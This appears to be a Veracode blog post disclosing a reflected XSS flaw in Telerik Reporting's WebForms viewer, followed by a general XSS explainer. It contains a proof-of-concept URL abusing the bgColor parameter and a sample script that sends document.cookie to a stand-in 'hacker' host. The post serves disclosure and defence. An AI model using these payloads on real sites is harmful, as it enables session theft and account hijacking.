# Anatomy of a Cross-Site Scripting Flaw in the Telerik Reporting Module

![](/sites/default/files/pictures/picture-7101-1488578873.jpg)

One of the interesting aspects of working as a Veracode Application Security Consultant is seeing the wide range of code across many business sectors. On an average day, I could look at some COBOL code twice my age in the morning, and by lunch I’m exploring a large .NET MVC app, before transitioning to review a self-deploying microservices package comprised of Java, node.js, and a little PHP for good measure. Besides just helping Veracode customers to secure their apps, I really enjoy learning the new trends, frameworks, and creative ways people use software to solve problems.

Occasionally, during a consultation, I’ll see something suspicious in the static or dynamic scan results that sticks out more than I’d expect for the type of application evaluated. In one particularly interesting case, I was working recently with a client who was pursuing a [Verified seal](//www.veracode.com/verified "How to Get VerAfied by Veracode") – a rigorous process that provides high assurances about the application security posture of an application.

The customer was building a web application on a .NET stack that, among other things, generated various printable reports. To accomplish that task, the developers were using the popular [Telerik Reporting](https://www.telerik.com/products/reporting.aspx "Progress Telerik Reporting") project, built by Progress. While I’ve seen many Telerik components used in other applications, this was my first time coming across the Reporting module in a web context, so I was surprised to discover a reflective [cross-site scripting (XSS)](https://www.veracode.com/security/xss "Knowledgebase Tutorial: Cross-Site Scripting") vulnerability within the Reporting component.

I reported the vulnerability (tracked as [CVE-2017-9140](https://nvd.nist.gov/vuln/detail/CVE-2017-9140 "National Vulnerability Database: CVE-2017-9140")) via email to the Progress team, who created a patch during their next update cycle. Now that the vulnerability has been properly fixed, I can safely share details of what I discovered and how to prevent and mitigate flaws of this type.

#### Details of the XSS Vulnerability

Reflective XSS occurs when applications mix untrusted data provided in an HTTP request with HTTP response content that is rendered without proper encoding. Unlike stored XSS attacks, which can affect many users of a service, reflective XSS requires that an attacker manipulate data within a request through some means or trick a user into clicking a malicious link containing an XSS payload.

In this case, our exploitation vector leverages an exposed parameter within the WebForms ReportViewer component. The default use is sufficient in this case. The ReportViewer is a simple web control used to view generated reports by adding a one-line snippet to any .aspx page, as such:

```

<telerik:reportviewer height="590px" id="ReportViewer1" runat="server" showexportgroup="False" shownavigationgroup="False" showrefreshbutton="False" width="750px">
</telerik:reportviewer>

```

The library then takes care of the rest to render a report in a container with various controls. In order to get the necessary data within the container and communicate with the rest of the application, the viewer component creates its own endpoint at `/Telerik.ReportViewer.axd.`

Upon initialization, several Ajax calls are made using this endpoint to bootstrap the viewer, pass additional parameters, and fetch viewer resources.

For example:

```

http://localhost:12345/Telerik.ReportViewer.axd?instanceID=2bc238bd3b46432cb985c71112373983&optype=Report&PageIndex=0&RenderID=8e61a09251404440853136b2f3b801cf&RenderingFormat=HTML5Interactive
```

Performing static analysis on an application using the ReportViewer as described here, I found the viewer accepted a request parameter to control the background color of the report. After some experimentation with a test application, I determined the `bgColor` parameter, when added to an HTTP request like above, would be passed back within the DOM without proper encoding as part of the style attribute of the <body> tag. To avoid dealing with URL encoding, the hash (#) character is replaced by an underscore (\_) by the application.

Therefore, to exploit the vulnerability, we could provide a simple proof-of-concept value to demonstrate script execution (in this case, causing a browser prompt alert):

```

http://localhost:12345/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)
```

The webpage would contain the following HTML snippet as a result:

```

<body style="background-color: #000000;" onload="prompt(1);">
```

With a little more poking, I determined the endpoint is directly accessible, making this a fairly straightforward reflective XSS attack, where I might trick a user to click a link to exploit this flaw directly on any site using a vulnerable ReportViewer control. Of course, once I can add arbitrary JavaScript to a page, all bets are off – I could potentially steal a user’s session, manipulate data, or compromise the host system through a browser exploit.

#### Patching, Prevention, and Mitigation

MITRE has rated this Telerik Reporting vulnerability as medium-severity (CVSS3: 6.1; CVSS2: 4.3), in part because an attacker would need to rely on some social engineering to exploit it. Nevertheless, organizations should make sure they are using a patched version of the component. If you are using the Telerik Reporting library, especially if you are using the viewer functionality, be sure to update your applications to version 11.0.17.406 (2017 SP2) or later. This particular vulnerability does not impact the newer HTML5 viewer, only the legacy WebForms Viewer (Telerik.ReportViewer.WebForms.dll).

As with most XSS flaws, the use of a contextual HTML encoder would prevent this vulnerability. In this case, since the data are output within a style attribute, we want to use an encoder targeted to that area of the DOM, like the HtmlAttributeEncode method provided by the .NET Security.AntiXSS namespace. I suspect this is what the Telerik Reporting team did when implementing their patch. Alternatively, using a client-side framework that handles output encoding automatically, like Angular, would also help avoid these issues.

This disclosure, as well as the thousands of others published each year, underscore the importance of pro-active and persistent application scanning. Be sure you regularly evaluate your application with [static and dynamic analysis](https://www.veracode.com/blog/secure-development/static-testing-vs-dynamic-testing "Static Vs. Dynamic Testing"), and, where appropriate, augment automated scans with [penetration tests](https://www.veracode.com/services/penetration-testing "Veracode Manual Penetration Testing"). Additionally, update [third-party components](https://info.veracode.com/best-practices-of-third-party-software-security-infographic-resource.html "Best Practices of Third-Party Software Security") frequently to ensure vulnerabilities are patched in a timely manner.

What is Cross-Site Scripting? XSS Cheat Sheet

# Cross-Site Scripting: XSS Cheat Sheet, Preventing XSS

Cross-site scripting attacks, also called XSS attacks, are a type of injection attack that injects malicious code into otherwise safe websites. An attacker will use a flaw in a target web application to send some kind of malicious code, most commonly client-side JavaScript, to an end user. Rather than targeting the application’s host itself, XSS attacks generally target the application’s users directly. Organizations and companies running web applications can leave the door open for XSS attacks if they display content from users or untrusted sources without proper escaping or validation.

XSS vulnerabilities are one of the OWASP Top 10 security concerns today, especially as so many organizations rely heavily on web applications for customer interaction and validation. However, by writing secure code, [testing for vulnerabilities](https://info.veracode.com/vulnerability-decoder-cross-site-scripting-infosheet-resource.html), and working with security tools like [Veracode Dynamic Analysis](https://www.veracode.com/products/dynamic-analysis-dast), developers can prevent, detect, and repair potential vulnerabilities allowing for XSS exploitation.

## What is Cross Site Scripting (XSS)?

XSS occurs when an attacker tricks a web application into sending data in a form that a user’s browser can execute. Most commonly, this is a combination of HTML and XSS provided by the attacker, but XSS can also be used to deliver malicious downloads, plugins, or media content. An attacker is able to trick a web application this way when the web application permits data from an untrusted source — such as data entered in a form by users or passed to an API endpoint by client software — to be displayed to users without being properly escaped.

Because XSS can allow untrusted users to execute code in the browser of trusted users and access some types of data, such as session cookies, an XSS vulnerability may allow an attacker to take [data from users](https://www.veracode.com/security/guide-data-loss-prevention) and dynamically include it in web pages and take control of a site or an application if an administrative or a privileged user is targeted.

Malicious content delivered through XSS may be displayed instantly or every time a page is loaded or a specific event is performed. XSS attacks aim to target the users of a web application, and they may be particularly effective because they appear within a trusted site.

### State of Software Security v11

[Read the Report](https://info.veracode.com/report-state-of-software-security-volume-11.html?utm_source=promo-offer&utm_medium=website&utm_campaign=sossv11)

## Key Concepts of XSS

* XSS is a web-based attack performed on vulnerable web applications.
* In XSS attacks, the victim is the user and not the application.
* In XSS attacks, malicious content is delivered to users using JavaScript.

## Cross Site Scripting Video

In short, XSS vulnerabilities occur when input coming into web applications is not validated and/or output to the browser is not properly escaped before being displayed.

The three most common types of XSS attacks are persistent, reflected, and DOM-based..

## XSS Attack Examples

### Persistent XSS

Also known as stored XSS, this type of vulnerability occurs when untrusted or unverified user input is stored on a target server. Common targets for persistent XSS include message forums, comment fields, or visitor logs—any feature where other users, either authenticated or non-authenticated, will view the attacker’s malicious content. Publicly visible profile pages, like those common on social media sites and membership groups, are one good example of a desirable target for persistent XSS. The attacker may enter malicious scripts in the profile boxes, and when other users visit the profile, their browser will execute the code automatically.

![persistent xss cross site scripting example]()

### Reflective XSS

On the other hand, reflected or non-persistent [cross-site scripting](https://www.veracode.com/blog/2012/07/what-is-cross-site-scripting) involves the immediate return of user input. To exploit a reflective XSS, an attacker must trick the user into sending data to the target site, which is often done by tricking the user into clicking a maliciously crafted link. In many cases, reflective XSS attacks rely on phishing emails or shortened or otherwise obscured URLs sent to the targeted user. When the victim visits the link, the script automatically executes in their browser.

Search results and error message pages are two common targets for reflected XSS. They often send unmodified user input as part of the response without ensuring that the data is properly escaped so that it is displayed safely in the browser..

![xss cross site scripting attack example]()

### DOM-Based XSS

DOM-based cross-site scripting, also called client-side XSS, has some similarity to reflected XSS as it is often delivered through a malicious URL that contains a damaging script. However, rather than including the payload in the HTTP response of a trusted site, the attack is executed entirely in the browser by modifying the DOM or Document Object Model. This targets the failure of legitimate JavaScript already on the page to properly sanitize user input.

## XSS Examples with Code Snippets

**Example 1.**

For example, the HTML snippet:

```

<title>Example document: %(title)</title>
```

is intended to illustrate a template snippet that, if the variable title has value [Cross-Site Scripting](https://www.veracode.com/blog/2012/07/what-is-cross-site-scripting), results in the following HTML to be emitted to the browser:

```

<title>Example document: XSS Doc</title>
```

A site containing a search field does not have the proper input sanitizing. By crafting a search query looking something like this:

```

"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
```

sitting on the other end, at the web server, you will be receiving hits where after a double space is the user's cookie. If an administrator clicks the link, an attacker could steal the session ID and hijack the session.

**Example 2.**

Suppose there's a URL on Google's site, `http://www.google.com/search?q=flowers`, which returns HTML documents containing the fragment

```

<p>Your search for 'flowers' returned the following results:</p>
```

i.e., the value of the query parameter q is inserted into the page returned by Google. Suppose further that the data is not validated, filtered or escaped.

Evil.org could put up a page that causes the following URL to be loaded in the browser (e.g., in an invisible*<iframe>*):

```

http://www.google.com/search?q=flowers+%3Cscript%3Eevil_script()%3C/script%3E
```

When a victim loads this page from www.evil.org, the browser will load the iframe from the URL above. The document loaded into the iframe will now contain the fragment

```

<p>Your search for 'flowers <script>evil_script()</script>'
```
```

returned the following results:</p>
```

Loading this page will cause the browser to execute *evil\_script()*. Furthermore, this script will execute in the context of a page loaded from *www.google.com.*

## Impact of Cross Site Scripting XSS

When attackers succeed in exploiting XSS vulnerabilities, they can gain access to account credentials. They can also spread [web worms](https://www.veracode.com/security/computer-worm) or access the user’s computer and view the user’s browser history or control the browser remotely. After gaining control to the victim’s system, attackers can also analyze and use other intranet applications.

By exploiting XSS vulnerabilities, an attacker can perform malicious actions, such as:

* Hijack an account.
* Spread web worms.
* Access browser history and clipboard contents.
* Control the browser remotely.
* Scan and exploit intranet appliances and applications.

## Identifying Cross-Site Scripting Vulnerabilities

XSS vulnerabilities may occur if:

* Input coming into web applications is not validated
* Output to the browser is not HTML encoded

## Detecting and Preventing XSS Vulnerabilities

XSS vulnerabilities can be prevented by consistently using secure coding practices. Our Veracode [vulnerability decoder](https://info.veracode.com/vulnerability-decoder-cross-site-scripting-infosheet-resource.html) provides useful guidelines for avoiding XSS-based attacks. By ensuring that all input that comes in from user forms, search fields, or submission requests is properly escaped, developers can prevent their applications from being misused by attackers.

Cross-site scripting prevention should be part of your development process, but there are steps you can take throughout each part of production that can detect potential vulnerabilities and prevent attacks.

## Resources for Cross-Site Scripting Prevention

Cross-site scripting prevention should be addressed in the early stages of development; however, if you’re already well into production there are still several cross-site prevention steps you can take to prevent an attack.

This blog post provides a summary of what you need to know about [Cross-Site Scripting](https://www.veracode.com/blog/2012/07/what-is-cross-site-scripting).

* Applications must validate data input to the web application from user browsers.
* All output from the web application to user browsers must be encoded.
* Users must have the option to disable client-site scripts.

Veracode’s testing services can quickly scan control and data flow for an application and accurately identify cross-site scripting and other flaws in code that is built in-house or acquired from third-parties. Scan results are returned quickly – usually within four hours – and include a step-by-step remediation plan that helps to accelerate fixes and prioritize efforts.

## Veracode Can Help You Protect Against XSS Attacks

Secure coding practices can help avoid introducing XSS vulnerabilities. However, no developer is always aware of every potential site for flaws or vulnerabilities. Veracode's [Developer Training](https://www.veracode.com/products/elearning) and eLearning tools can teach secure coding practices while Veracode [Security Labs](https://www.veracode.com/products/security-labs) provides hands-on training to enable all developers to write secure code and embed security into their projects from the beginning.

[Veracode Discovery](https://www.veracode.com/products/discovery) tests web applications, discovering and inventorying Internet-facing applications and scanning for vulnerabilities, including [SQL injection vulnerabilities](https://www.veracode.com/security/sql-injection), [CSRF attacks](https://www.veracode.com/security/cross-site-request-forgery-guide-learn-all-about-csrf-attacks-and-csrf-protection), [LDAP injections](https://www.veracode.com/security/ldap-injection), and [mobile application flaws](https://www.veracode.com/security/mobile-code-security). Veracode [Dynamic Analysis](https://www.veracode.com/products/dynamic-analysis-dast) efficiently scans web applications, finds vulnerabilities, and guides developers to address issues, all before your application goes live.
